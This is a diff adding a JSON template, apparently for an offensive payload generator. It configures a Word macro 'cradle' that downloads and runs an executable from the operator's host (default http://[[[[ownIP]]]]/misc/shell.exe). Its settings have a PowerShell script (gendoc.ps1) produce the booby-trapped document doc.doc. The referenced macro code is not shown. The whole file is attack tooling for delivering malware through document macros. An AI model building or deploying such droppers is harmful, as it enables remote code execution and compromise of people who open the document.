@@ -1,0 +1,38 @@
+{
+    "category" : ["Word","Cradle"],
+    "description" : "Macro cradle that downloads and runs an .exe",
+    "contentFile" : "worddownloadmacro.txt",
+    
+    "customAttributes" : [
+        {
+            "name":"downloadedFrom",
+            "description" : "The URL where the executable will downloaded from.",
+            "defaultValue" : "http://[[[[ownIP]]]]/misc/shell.exe"   
+        },
+        {
+            "name":"downloadedAs",
+            "description" : "The filename the downloaded executable will be saved as.",
+            "defaultValue" : "shell.exe"   
+        }
+    ],
+
+    "shellCode" : {
+        "hasShellCode":false
+    },
+    "compilation": {
+      "compilationType": "macro",
+      "compilationAttributes": [
+        {
+          "name": "saveAs",
+          "description": "Name of the powershell file to be created, can be full path or just a name",
+          "defaultValue": "gendoc.ps1"
+        },
+        {
+          "name": "wordDocOut",
+          "description": "Name of the word doc file to be created by the powershell script.",
+          "defaultValue": "doc.doc"
+        }
+      ]
+    },
+    "runHint" : "If wordDocOut is relative it it'll end up in the current users documents folder."
+}
